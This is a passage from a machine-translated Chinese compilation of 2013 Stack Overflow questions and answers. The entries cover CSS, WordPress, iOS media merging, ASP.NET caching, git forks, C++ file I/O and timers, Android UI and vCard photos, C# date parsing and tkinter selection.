<img src="http://i00.i.aliimg.com/wsphoto/v0/789295022/-font-b-Easter-b-font-day-font-b-Bunny-b-font-ears.jpg" width="650" height="350" alt=""> 
```

**解决：**通过添加这个->

```
.mycommentpost > img{
    max-height: XXXpx !important;
    max-width: XXXpx !important;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:24:54.720

添加到您的 CSS

```
.mycommentpost > img{
    max-height: XXXpx !important;
    max-width: XXXpx !important;
} 
```

这样，您将限制添加图像的最大尺寸..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:24:53.907

试试这个

```
<div class="mycomment">
    <div id="postpic">
        <img id="profile_pic" width="50px" height="150px" src="image/user/1.gif" class="">
    </div>
    <div class="mycommentpost">                     
        <a class="postername" href="profile.php?userID=1">Deepak Kumar: </a><br>
        <img src="http://i00.i.aliimg.com/wsphoto/v0/789295022/-font-b-Easter-b-font-day-font-b-Bunny-b-font-ears.jpg" width="650" height="350" alt="">
    </div> 
```

```
.mycommentpost {
font-weight: normal;
color: #000000;
letter-spacing: 1pt;
width: 480px;
float: left;
}
.mycommentpost img{
 width :450px;   
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:30:20.303

无论他们使用此 css 上传什么大小的图像，都将图像设置为 mycommentpost div 中的默认大小。

```
> .mycommentpost img{
>      border: 1px solid #DEDEDE;
>     padding: 10px;
>     width: 130px; } 
```

# css - 在 Wordpress 中突出显示当前页面菜单项的字体颜色

> ID：15738593
> 
> 赞同：0
> 
> 时间：2013-04-01T06:18:49.277
> 
> 标签：css, wordpress

我正在尝试突出显示 wordpress 中的当前菜单项。我尝试了以下代码：

```
#menu-menu li.current-menu-item a { background-color:#d9707a; }
#menu-menu li.current_page_item a { background-color:#d9707a; } 
```

上面的代码工作正常，但实际上我想做的是通过改变颜色来突出显示，所以我尝试了下面的代码，但它不起作用

```
#menu-menu li.current-menu-item a { color:#d9707a; }
#menu-menu li.current_page_item a { color:#d9707a; } 
```

你能告诉我如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:23:09.727

我们对您的设置知之甚少，无法知道确切的问题是什么。但在我看来，`color`由于*风格的特殊性*，您的风格可能会被覆盖。

追踪覆盖的样式`color`（使用您的浏览器检查器）并在那里更改它（但您需要确认这样做是安全的，因为该样式可能会影响您网站的其他部分）**或者**，快速和`!important`向样式添加标签的肮脏方法。

**例子：**

```
#menu-menu li.current-menu-item a { color:#d9707a !important; }
#menu-menu li.current_page_item a { color:#d9707a !important; } 
```

**有关样式特异性的更多信息：**

[CSS 选择器之间的优先级是什么](https://stackoverflow.com/questions/1637343/what-are-the-priorities-among-css-selectors)
[理解 CSS 选择器](https://stackoverflow.com/questions/514506/understanding-css-selectors)

# ios - 如何在 iOS 中合并音频和视频文件以及如何保存？

> ID：15738602
> 
> 赞同：-6
> 
> 时间：2013-04-01T06:19:21.947
> 
> 标签：ios

我想在 iOS 中合并音频和视频文件

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:28:03.107

用这个我在网上的某个地方找到的，我不记得了，....

```
NSString  *fileNamePath = @"audio.caf";
NSArray   *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask, YES);
NSString  *documentsDirectory = [paths  objectAtIndex:0];
NSString  *oldappSettingsPath = [documentsDirectory stringByAppendingPathComponent:fileNamePath];
NSURL *audioUrl = [NSURL fileURLWithPath:oldappSettingsPath];   
NSString  *fileNamePath1 = @"output.mp4";
NSArray   *paths1 = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask, YES);
NSString  *documentsDirectory1 = [paths1  objectAtIndex:0];
NSString  *oldappSettingsPath1 = [documentsDirectory1 stringByAppendingPathComponent:fileNamePath1];
NSLog(@"oldpath=%@",oldappSettingsPath);
NSURL *videoUrl = [NSURL fileURLWithPath:oldappSettingsPath1];
if (avPlayer.duration >0.00000)
{
    NSLog(@"SOMEDATA     IS THERE ");
    AVURLAsset* audioAsset = [[AVURLAsset alloc]initWithURL:audioUrl options:nil];
    AVURLAsset* videoAsset = [[AVURLAsset alloc]initWithURL:videoUrl options:nil];

    AVMutableComposition* mixComposition = [AVMutableComposition composition];

    NSLog(@"audio =%@",audioAsset);
    AVMutableCompositionTrack *compositionCommentaryTrack = [mixComposition addMutableTrackWithMediaType:AVMediaTypeAudio preferredTrackID:kCMPersistentTrackID_Invalid];
    [compositionCommentaryTrack insertTimeRange:CMTimeRangeMake(kCMTimeZero, audioAsset.duration) ofTrack:[[audioAsset tracksWithMediaType:AVMediaTypeAudio] objectAtIndex:0] atTime:kCMTimeZero error:nil];

    AVMutableCompositionTrack *compositionVideoTrack = [mixComposition addMutableTrackWithMediaType:AVMediaTypeVideo preferredTrackID:kCMPersistentTrackID_Invalid];
    [compositionVideoTrack insertTimeRange:CMTimeRangeMake(kCMTimeZero, videoAsset.duration) ofTrack:[[videoAsset tracksWithMediaType:AVMediaTypeVideo] objectAtIndex:0] atTime:kCMTimeZero error:nil];

    AVAssetExportSession* _assetExport = [[AVAssetExportSession alloc] initWithAsset:mixComposition presetName:AVAssetExportPresetPassthrough];   

    NSString* videoName = @"export.mov";

    NSString *exportPath = [NSTemporaryDirectory() stringByAppendingPathComponent:videoName];
    NSURL    *exportUrl = [NSURL fileURLWithPath:exportPath];

    if ([[NSFileManager defaultManager] fileExistsAtPath:exportPath]) 
    {
        [[NSFileManager defaultManager] removeItemAtPath:exportPath error:nil];
    }

    _assetExport.outputFileType = @"com.apple.quicktime-movie";
    NSLog(@"file type %@",_assetExport.outputFileType);
    _assetExport.outputURL = exportUrl;
    _assetExport.shouldOptimizeForNetworkUse = YES;

    [_assetExport exportAsynchronouslyWithCompletionHandler:
     ^(void ) 
    {      

        NSString  *fileNamePath = @"sound_record.mov";
        NSArray   *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask, YES);
        NSString  *documentsDirectory = [paths  objectAtIndex:0];
        NSString  *oldappSettingsPath = [documentsDirectory stringByAppendingPathComponent:fileNamePath];

        //             if ([[NSFileManager defaultManager]    fileExistsAtPath:oldappSettingsPath]) {
//                 

//                 NSFileManager *fileManager = [NSFileManager defaultManager];  
//                 [fileManager removeItemAtPath: oldappSettingsPath error:NULL];
//                 
//             }

         NSURL *documentDirectoryURL = [NSURL fileURLWithPath:oldappSettingsPath];
         [[NSFileManager defaultManager] copyItemAtURL:exportUrl toURL:documentDirectoryURL error:nil];
         [audioAsset release];
         [videoAsset release];
         [_assetExport release];
     }       
     ]; 
```

# c# - 从 Asp.Net 中的用户控件中清除输出缓存

> ID：15738603
> 
> 赞同：2
> 
> 时间：2013-04-01T06:19:24.677
> 
> 标签：c#, asp.net, caching

我有一个带有名称的用户控件`uc_Menu.ascx`。`menues`是动态加载的`Role`。所以，我将它包含在用户控件中并像这样缓存它；
注意：出于测试目的，我只提供了 60 秒的缓存；

```
<%@ OutputCache Duration="60" VaryByParam="none" %>
<td id="Menu">
    <div id="firstpane" runat="server" class="menu_list">
        <p class="menu_head">
            <a href="/forms/Dashboard.aspx">
                <span style="background: url('/App_Themes/Default/Images/icons/ic_grid.png') no-repeat"></span>
                DashBoard
            </a>
        </p>
    </div>
</td> 
```

后面的代码是这样的；

```
protected void Page_Load(object sender, EventArgs e)
{
    if (!Page.IsPostBack)
    {
        BulitMenus();
        Response.Write("<h1>" + DateTime.Now.ToString() + "</h1>");
    }
} 
```

我引用了上述用户控件的母版页；

```
<%@ Register Src="~/UserControls/uc_Menu.ascx" TagPrefix="Ken" TagName="Menu" %>
<Ken:Menu runat="server" id="Menus" /> 
```

现在，当我对此进行测试时，它工作正常（第一次加载页面时，缓存工作）
**但是，我想在用户单击`LogOff`按钮（在母版页上）**时清除缓存，因为菜单是角色基础和管理员可能会给用户更多权限。在这种情况下，有必要再次重新设置菜单。那么，如何从用户控件中清除缓存；
**注意：**我也试过这个，但它不起作用； [http://aspalliance.com/668_Remove_ASPNET_Page_Output_Cache_Entries](http://aspalliance.com/668_Remove_ASPNET_Page_Output_Cache_Entries)
和

```
protected void Lbtn_LogOff_Click(object sender, EventArgs e)
{

    HttpResponse.RemoveOutputCacheItem("/UserControls/uc_Menu.ascx");
    // this code is copied from a url above which i have included i my question
    HttpContext.Current.Cache.Insert("Pages", DateTime.Now, null,
       System.DateTime.MaxValue, System.TimeSpan.Zero,
       System.Web.Caching.CacheItemPriority.NotRemovable, null);

    FormsAuthentication.SignOut();
    Response.Redirect("~/authorization/Login.aspx");
} 
```

# git - 更新分叉 Github

> ID：15738604
> 
> 赞同：3
> 
> 时间：2013-04-01T06:19:40.410
> 
> 标签：git, github

我已经分叉了一个远程仓库，它有 3 个分支

1.  掌握
2.  一种
3.  b

但是该团队向遥控器添加了新的分支。目前的分支机构是

1.  掌握
2.  一种
3.  b
4.  C
5.  d
6.  e

但我的叉子只有 3 个分支。我应该如何更新我的 fork 以包含远程仓库中存在的所有分支（包括新添加的分支）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T07:12:42.147

将原始 repo 作为第二个远程添加到本地 repo：

```
git remote add parentrepo <url> 
```

从中获取所有分支：

```
git fetch parentrepo 
```

鉴于您所说的，`git branch -a`应该给出（假设您`origin`在克隆时默认使用了 fork 的别名）

```
* master
origin/master
origin/a
origin/b
parentrepo/a
parentrepo/b
parentrepo/c
parentrepo/d
parentrepo/e 
```

您可以从 parentrepo 本地分支任何远程分支，就像对 origin 所做的那样，和/或将它们直接推送到 origin。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T08:06:41.337

现在，涉及两个步骤。从远程存储库中获取新添加的分支并将这些分支推送到您的 fork。

要从远程存储库中获取新添加的分支，说原始的，请执行

```
1\. git remote add original {url_to_remote}
2\. git fetch original 
```

请参阅此[从远程存储库中提取分支 SO Link](https://stackoverflow.com/questions/5884784/how-to-pull-remote-branch-from-somebody-elses-repo)

现在，我们已经在本地 repo 中提取了远程分支。接下来，我们要将这些分支发送到我们的 fork。

```
1\. git push -u origin {branch_name} // Origin is your fork 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-08-05T15:11:47.503

只是为了在团队删除远程分支并且您没有更新时保护自己，我会执行 2 个命令：

```
git remote prune origin 
```

和

```
git fetch origin 
```

# c++ - C++ 快速读取较大文件的最佳方法

> ID：15738605
> 
> 赞同：4
> 
> 时间：2013-04-01T06:20:04.907
> 
> 标签：c++

在运行时，我经常需要读取较大文件（300 mb）的一小部分。目前我总是打开文件，从中读取，然后像这样再次关闭它：

```
FILE *file =fopen(szFileName,"rb");
if (file)
{
    fseek( file,iFirstByteToRead, SEEK_SET);
    fread(nEncodedBytes,sizeof(unsigned char), iLenCompressedBytes, file);
    fclose(file);
} 
```

但这太慢了，因为我经常这样做。我也不确定 fread 是否可以加快速度。

请问这种情况下的最佳做法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:22:42.997

保持文件打开，你会做得更好。

仍然尝试`mmap`提高性能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:51:33.017

与文件控制相关的工作总是导致昂贵的成本。如果您控制多次管理文件，则不必关闭文件指针。

如下所示，一旦你得到文件指针，

```
FILE *stream = fopen(stream, “rb”);

if (stream != NULL) 
```

您必须在程序完成后关闭流文件指针，并且如果您必须管理多个文件，您将使用专用于文件读取的线程。

# android - android中的选框文本，文本显示在数组中

> ID：15738607
> 
> 赞同：-4
> 
> 时间：2013-04-01T06:20:25.483
> 
> 标签：android

如何以一定的间隔和步长水平或垂直选取文本？文本从数组中显示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:24:24.523

这将帮助您水平选框

```
<TextView
    android:id="@+id/scroller" 
    android:layout_width="fill_parent" 
    android:layout_height="wrap_content" 
    android:lines="1" 
    android:ellipsize="marquee" 
    android:marqueeRepeatLimit="marquee_forever" 
    android:scrollHorizontally="true"
    android:focusable="true" 
    android:focusableInTouchMode="true" 
    android:text="text that is longer than the view"></TextView> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T07:34:19.993

我不确定我是否正确理解了您的问题。您可以使用 x 和 y 位置在 cusotm 视图上绘制文本。更改 x 和 y 位置并调用 invalidate 以刷新绘图。下面的示例将文本 hello... 从右向左移动。

```
public class MainActivity extends Activity {
float x,y;
TextView tv;
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    DrawingView dv= new DrawingView(this);
    setContentView(dv); 
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
}
class DrawingView extends View
{
    Context mcontext;
    Paint mPaint;
    Display display ;
    public DrawingView(Context context) {
        super(context);
        mPaint = new Paint();
        mPaint.setColor(Color.RED);
        mPaint.setTextSize(50f);
        mcontext=context;
         display = ( (Activity) mcontext).getWindowManager().getDefaultDisplay();  
        x = display.getWidth()-mPaint.getTextSize(); 
        //y = display.getHeight();
        // TODO Auto-generated constructor stub
    }

    @Override
    protected void onDraw(Canvas canvas) {
        // TODO Auto-generated method stub
        super.onDraw(canvas);

        canvas.drawText("hello.....",x, 40, mPaint);
        marquee();
    }
    public void marquee()
    {
        if(x>0-mPaint.getTextSize())
        {
            x=x-20;
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            invalidate();
        }
        else if(x<=0)
        {
              x = display.getWidth()-mPaint.getTextSize(); 
              invalidate();
        }

    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:25:20.090

您可以按如下方式进行水平滚动。

用于文本视图的 xml

```
<TextView
android:id="@+id/label"
android:layout_width="fill_parent"
android:layout_height="wrap_content"
android:ellipsize="marquee"
android:marqueeRepeatLimit="marquee_forever"
android:singleLine="true" /> 
```

此 TextView 的代码

如果你想做一个股票行情

```
textView.setSelected(true); 
```

如果你想阻止它

```
textView.setSelected(false); 
```

我假设您正在从 ListActivity 扩展您的活动。在您的 onListItemClick 中执行以下操作

```
public void onListItemClick(ListView parent, View row, int position, long id) {

TextView textViewOne =   (TextView)row.findViewById(R.id.text_view);
textViewOne.setSelected(true);
for (int i = 0; i < parent.getChildCount(); i++) {
    if(i!=position){
        View view = (View) parent.getChildAt(i).findViewById(R.id.view);

        textViewOne = (TextView)view.findViewById(R.id.text_view);
        textViewOne.setSelected(false);

    }
} 
```

}

# c# - 将 dd/mm/yyyy 格式的字符串转换为日期时间

> ID：15738608
> 
> 赞同：111
> 
> 时间：2013-04-01T06:20:30.933
> 
> 标签：c#, string, datetime

我是 DotNet 和 C# 的新手。我想将`mm/dd/yyyy`格式中的字符串转换为`DateTime`对象。我尝试了下面的解析函数，但它引发了运行时错误。

```
DateTime dt=DateTime.Parse("24/01/2013"); 
```

关于如何将其转换为日期时间的任何想法？

* * *

## 回答 #1

> 赞同：282
> 
> 时间：2013-04-01T06:21:03.543

您需要使用[`DateTime.ParseExact`](http://msdn.microsoft.com/en-us/library/system.datetime.parseexact.aspx)with 格式`"dd/MM/yyyy"`

```
DateTime dt=DateTime.ParseExact("24/01/2013", "dd/MM/yyyy", CultureInfo.InvariantCulture); 
```

如果您使用`d/M/yyyy`该格式，它会更安全，因为它将处理一位数和两位数的日/月。但这真的取决于您是否期望一位/两位数的值。

* * *

您的日期格式`day/Month/Year`可能是某些文化可接受的日期格式。例如，加拿大文化`en-CA` `DateTime.Parse`的工作方式如下：

```
DateTime dt = DateTime.Parse("24/01/2013", new CultureInfo("en-CA")); 
```

或者

```
System.Threading.Thread.CurrentThread.CurrentCulture = new CultureInfo("en-CA");
DateTime dt = DateTime.Parse("24/01/2013"); //uses the current Thread's culture 
```

上述两行都可以工作，因为字符串的格式对于`en-CA`文化是可以接受的。由于您没有为`DateTime.Parse`呼叫提供任何文化，因此您当前的文化用于解析不支持日期格式的文化。[在DateTime.Parse](http://msdn.microsoft.com/en-us/library/system.datetime.parse(v=vs.110).aspx)阅读更多关于它的信息。

* * *

另一种解析方法是使用[`DateTime.TryParseExact`](http://msdn.microsoft.com/en-us/library/system.datetime.tryparse(v=vs.110).aspx)

```
DateTime dt;
if (DateTime.TryParseExact("24/01/2013", 
                            "d/M/yyyy", 
                            CultureInfo.InvariantCulture, 
                            DateTimeStyles.None,
    out dt))
{
    //valid date
}
else
{
    //invalid date
} 
```

.Net 框架中的`TryParse`方法组不会对无效值抛出异常，而是返回一个`bool`指示解析成功或失败的值。

**请注意**，我分别使用了单日`d`和`M`月。Single`d`和`M`适用于单/双位数的日期和月份。因此，对于格式，`d/M/yyyy`有效值可能是：

*   “2013 年 1 月 24 日”
*   “2013 年 1 月 24 日”
*   “2013 年 4 月 12 日” //2013 年 12 月 4 日
*   “2013 年 4 月 12 日”

如需进一步阅读，您应该看到：[自定义日期和时间格式字符串](http://msdn.microsoft.com/en-us/library/8kb3ddd4.aspx)

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-04-01T06:21:40.173

采用`DateTime.ParseExact`

```
string strDate = "24/01/2013";
DateTime date = DateTime.ParseExact(strDate, "dd/MM/yyyy", null) 
```

*   [DateTime.ParseExact](http://msdn.microsoft.com/en-us/library/system.datetime.parseexact.aspx)

`null`将使用当前的文化，这有些危险。尝试提供特定的文化

```
DateTime date = DateTime.ParseExact(strDate, "dd/MM/yyyy", CultureInfo.InvariantCulture) 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-04-01T06:22:38.583

您可以使用`"dd/MM/yyyy"`格式在[`DateTime.ParseExact`](http://msdn.microsoft.com/en-us/library/w2sa9yss.aspx).

> 使用指定的格式和特定​​于区域性的格式信息将日期和时间的指定字符串表示形式转换为其等效的 DateTime。**字符串表示的格式必须与指定的格式完全匹配。**

```
DateTime date = DateTime.ParseExact("24/01/2013", "dd/MM/yyyy", CultureInfo.InvariantCulture); 
```

这是一个[`DEMO`](http://ideone.com/UjZzVB).

欲了解更多信息，请查看[`Custom Date and Time Format Strings`](http://msdn.microsoft.com/en-us/library/8kb3ddd4.aspx)

# c++ - C++ noob：我需要帮助来创建一个简单的计时器函数

> ID：15738611
> 
> 赞同：2
> 
> 时间：2013-04-01T06:20:59.647
> 
> 标签：c++, visual-studio, countdowntimer

我是 C++ 初学者。我正在寻找一种方法来为一个非常简单的控制台游戏（类分配）提供一个简单的计时器功能。希望来自公共库的预先存在的功能？请保持简单，因为我是新手。谢谢。抱歉，如果我的措辞不正确。这个论坛也是全新的！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:24:56.340

[http://en.cppreference.com/w/cpp/chrono/c/time](http://en.cppreference.com/w/cpp/chrono/c/time)

[http://www.cplusplus.com/reference/ctime/](http://www.cplusplus.com/reference/ctime/)

它与任何其他循环或迭代没有什么不同，只需使用给定的值/常数作为您的条件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:25:51.937

您可以`time`使用`#include <time.h>`. 使用它来获取开始和停止时间，然后减去以获取经过的时间。信息[在这里](http://www.cplusplus.com/reference/ctime/time/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:31:43.163

假设您在 Win32 中使用普通 C++，则有一个函数`SetTimer()`如下`Win32 API`所示

```
UINT myTimer = SetTimer ( hwnd, ID_60SECONDS, 60 * 1000, NULL ); 
```

然后，您需要向`case`您添加一条语句`WndProc`来处理经过的计时器

```
case WM_TIMER:
switch (wParam)

{

    case ID_60SECONDS:

    // We processed it, so return 0

    return 0;

}

break; 
```

不幸的是，这涉及到处理 Win32，这并不容易，但一旦你掌握了窍门，那就很明显了。

我从[本](http://suite101.com/article/using-the-win32-timer-api-a23678)教程中获取了代码。

# user-interface - 如何在 tkinter python gui 中用鼠标选择多个对象？

> ID：15738617
> 
> 赞同：3
> 
> 时间：2013-04-01T06:21:37.730
> 
> 标签：user-interface, python-2.7, tkinter

我正在尝试使用鼠标选择多个对象，就像在窗口中单击并拖动一样。我在 python 中使用 tkinter 来构建这个 gui。我正在创建对象，如下面的代码所示。

```
import Tkinter as tk
from Tkinter import *

root = Tk()
w= Canvas(root, width=800, height=768)
w.grid()
w.create_line(200,200,300,300, width=3, tags="line1")
w.create_oval(150,100,170,300, fill="red", tags="oval")

mainloop() 
```

我想要做的是，如果我将鼠标拖到多个对象上，一些 def 应该返回对象的标签。我怎样才能做到这一点。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T10:51:51.097

保存按钮按下事件的坐标，然后在按钮按下事件上使用画布的[find_enclosed](http://effbot.org/tkinterbook/canvas.htm#Tkinter.Canvas.find_enclosed-method)或[find_overlapping](http://effbot.org/tkinterbook/canvas.htm#Tkinter.Canvas.find_overlapping-method)方法查找该区域所包围的所有项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-07-06T04:18:15.610

以下代码呈现一个跟随光标的矩形，并返回矩形内元素的元素 ID 列表。当鼠标在画布中按下、移动和释放时，它使用绑定。然后，我保留了一个带有画布标识符的元素列表，并使用它从选定的 ID 列表中查找对象。

```
# used to record where dragging from
originx,originy = 0,0

canvas.bind("<ButtonPress-1>", __SelectStart__)
canvas.bind("<B1-Motion>", __SelectMotion__)
canvas.bind("<ButtonRelease-1>", __SelectRelease__)

# binding for drag select
def __SelectStart__(self, event):
    oiginx = canvas.canvasx(event.x)
    originy = canvas.canvasy(event.y)
    selectBox = canvas.create_rectangle(originx,originy,\
        originx,originy)

# binding for drag select
def __SelectMotion__(self, event):
    xnew = canvas.canvasx(event.x)
    ynew = canvas.canvasy(event.y)
    # correct cordinates so it gives (upper left, lower right)
    if xnew < x and ynew < y:
        canvas.coords(selectBox,xnew,ynew,originx,originy)
    elif xnew < x:
        canvas.coords(selectBox,xnew,originy,originx,ynew)
    elif ynew < y:
        canvas.coords(selectBox,originx,ynew,xnew,originy)
    else:
        canvas.coords(selectBox,originx,originy,xnew,ynew)

# binding for drag select
def __SelectRelease__(self, event):
    x1,y1,x2,y2 = canvas.coords(selectBox)
    canvas.delete(selectBox)
    # find all objects within select box
    selectedPointers = []
    for i in canvas.find_withtag("tag"):
        x3,y3,x4,y4 = canvas.coords(i)
        if x3>x1 and x4<x2 and y3>y1 and y4<y2:
            selectedPointers.append(i)
    Callback(selectedPointers)

# function to receive IDs of selected items
def Callback(pointers):
    print(pointers) 
```

# android - AChartEngine 条形图边距问题

> ID：15738621
> 
> 赞同：2
> 
> 时间：2013-04-01T06:21:50.363
> 
> 标签：android, bar-chart, achartengine, margins

首先，这是我的应用程序当前外观的链接：[![ds](https://i.stack.imgur.com/Qll9l.png)](https://i.stack.imgur.com/Qll9l.png)

在显示的两个图表中，我想去掉条形图左侧的边距。有任何想法吗？

以下是我的渲染器设置。我已经搜索并无法找到有类似问题的人。看起来应该很简单...

```
private void drawBarChart(XYMultipleSeriesDataset dataset) {
    int marginT = 10;
    int marginL = 5;
    int marginB = 10;
    int marginR = 5;
    int[] margins = {marginT, marginL, marginB, marginR};

    ...

    XYMultipleSeriesRenderer renderer = buildBarRenderer(colors);
    renderer.setOrientation(Orientation.VERTICAL);
    renderer.getSeriesRendererAt(0).setDisplayChartValues(false);
    renderer.getSeriesRendererAt(1).setDisplayChartValues(false);
    renderer.getSeriesRendererAt(2).setDisplayChartValues(false);
    renderer.setLabelsColor(Color.LTGRAY);
    renderer.setAxesColor(Color.BLACK);
    renderer.setYAxisMin(0);
    renderer.setMargins(margins);
    renderer.setYAxisMax(maxYVal);
    renderer.setYLabels(0);
    renderer.setXLabels(0);
    renderer.setXAxisMin(0);
    renderer.setXAxisMax(2);
    renderer.setZoomEnabled(false,false);
    renderer.setPanEnabled(false, false);
    renderer.setBarSpacing(-0.5);
    renderer.setShowAxes(false);
    renderer.setShowLabels(false);
    renderer.setShowLegend(false);

    ...

    display chart in view
}

protected XYMultipleSeriesRenderer buildBarRenderer(int[] colors) {
    XYMultipleSeriesRenderer renderer = new XYMultipleSeriesRenderer();
    int length = colors.length;
    for (int i = 0; i < length; i++) {
        SimpleSeriesRenderer r = new SimpleSeriesRenderer();
        r.setColor(colors[i]);
        renderer.addSeriesRenderer(r);
    }
    return renderer;
} 
```

任何帮助将不胜感激，谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-01T06:49:06.247

偷偷摸摸。

我一直在玩边距，因为我决定使用我自己的 TextViews 作为标题，因为它们渲染得比 AChartEngine 渲染的标题好得多。根据文档，它说明边距工作如下：

```
margins - an array containing the margin size values, in this order: top, left, bottom, right 
```

这就是为什么我将边距变量设置如下：

```
int[] margins = {marginT, marginL, marginB, marginR}; 
```

事实证明，对于水平条形图，marginB 控制左边距，marginT 控制右边距。换句话说，所有边距都必须顺时针旋转才能按预期工作。（即改变右边距，你改变'top'的边距；改变上边距，你改变'left'的边距；等等）

# java - 将联系人的照片写入vcf文件，android

> ID：15738628
> 
> 赞同：4
> 
> 时间：2013-04-01T06:22:45.700
> 
> 标签：java, android, android-contacts, vcf-vcard

我正在使用显示所有联系人列表的代码。当我从列表中选择一个联系人时，联系人的详细信息会显示并保存在 .vcf 文件中（以正确的 vcard 格式），工作正常。当我选择一个也有照片的联系人时，它会在 imageView 中显示照片，但我不知道如何在 vcf 文件中写入照片。我用过这些线，

```
Uri photoUri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,Integer.parseInt(item));
Bitmap photoBitmap;
ContentResolver cr = getContentResolver();
InputStream is = ContactsContract.Contacts.openContactPhotoInputStream(cr, photoUri);
photoBitmap = BitmapFactory.decodeStream(is);
ByteArrayOutputStream bos = new ByteArrayOutputStream();
photoBitmap.compress(CompressFormat.JPEG, 100 , bos);
byte[] bitmapdata = bos.toByteArray();
imageEncoded = Base64.encodeToString(bitmapdata,Base64.DEFAULT);

String content = "BEGIN:VCARD\nVERSION:3.0\nCLASS:PUBLIC\nPRODID:-//class_vcard from  TroyWolf.com//NONSGML Version 1//EN\nFN:"+contactName+"\nTEL;TYPE=cell,voice:"+number+"\nPHOTO;TYPE=JPEG;ENCODING=BASE64:"+imageEncoded+"\nTZ:+0000\nEND:VCARD"; 
```

但是我在阅读联系人时遇到错误（“由于意外原因无法解析 vCard，无效行：”）任何人都可以帮我解决问题！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T13:32:34.787

尝试将`ENCODING`参数的值从更改`BASE64`为`B`。 `B`是在 3.0 vCards 中使用的正确值。

此外，vCard 的正确换行符序列是`\r\n`，而不是`\n`。

您可能对使用 vCard 库生成 vCard 感兴趣。 [ez-vcard](http://code.google.com/p/ez-vcard)就是这样一个库（免责声明：我是作者）。

```
VCard vcard = new VCard();
vcard.setClassification("PUBLIC");
vcard.setProdId("-//class_vcard from  TroyWolf.com//NONSGML Version 1//EN");
vcard.setFormattedName(contactName);

TelephoneType tel = vcard.addTelephoneNumber(number);
tel.addType(TelephoneTypeParameter.CELL);
tel.addType(TelephoneTypeParameter.VOICE);

PhotoType photo = new PhotoType(bitmapdata, ImageTypeParameter.JPEG);
vcard.addPhoto(photo);

vcard.setTimezone(new TimezoneType(0, 0));

String content = Ezvcard.write(vcard).version(VCardVersion.V3_0).prodId(false).go(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-12T05:34:59.167

这是一篇很晚的帖子，但是如果不使用该库，我在 StackOverflow 上找不到任何可行的解决方案，所以我认为分享我的发现会很好。

更改编码参数和更正换行符序列不足以构建带有照片的 .vcf 文件。在编码为 base64 后，我还必须删除换行符。

将 Uri 转换为 base64 格式的示例代码（根据需要替换 imageStream 初始化）。

```
// string you can use to write to vcf file (3.0 vCards)
String.format("PHOTO;ENCODING=B;TYPE=JPEG: ,%s\r\n", convertUriToBase64(context, photoUri));

private String convertUriToBase64(Context context, String photoUri) {
    InputStream imageStream = null;
    try {
        imageStream = context.getContentResolver().openInputStream(Uri.parse(photoUri));

    } catch (FileNotFoundException e) {
        e.printStackTrace();
    }
    Bitmap bitmap = BitmapFactory.decodeStream(imageStream);
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    bitmap.compress(Bitmap.CompressFormat.JPEG, 100, bos);
    byte[] bitmapData = bos.toByteArray();
    // line break has to be removed, so it is on the same line as PHOTO
    return Base64.encodeToString(bitmapData, Base64.DEFAULT).replaceAll("\n", "");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-01T04:14:23.267

这是我为将照片作为 vCard 的一部分发送的操作...需要考虑的重要事项：

1）设备：运行Android 6.01的中兴Axon 7

2) 无法让 vCard 3.0 或 4.0 正常运行，只能使用 vCard 2.1

```
File vcfFile = new File(DisplayContactActivity.this.getExternalFilesDir(null), "generated.vcf");
                    try
                    {
                        /**Only Version 2.1 worked for me with or without PHOTO**/
                        FileWriter fw = new FileWriter(vcfFile);
                        fw.write("BEGIN:VCARD\r\n");
                        fw.write("VERSION:2.1\r\n");

                        fw.write("FN:" + "Contact 7" + "\r\n");

                        /*Getting the name of the File as I had saved it*/
                        String file_name = ("current_contact_image" + CONTACT_ID);

                        /*Get the bitmap that we stored in a File*/
                        Bitmap bitmap = getContactImage(file_name);

                        /*Convert bitmap to Base64*/
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
                        byte[] b = baos.toByteArray();
                        String image_encoded = Base64.encodeToString(b, Base64.DEFAULT);

                        /*Write the encoded version of image to vCard 2.1, NOTICE that no determining whether the image is GIF or JPEG is needed*/   
                        fw.write("PHOTO;ENCODING=BASE64:" + image_encoded + "\r\n");

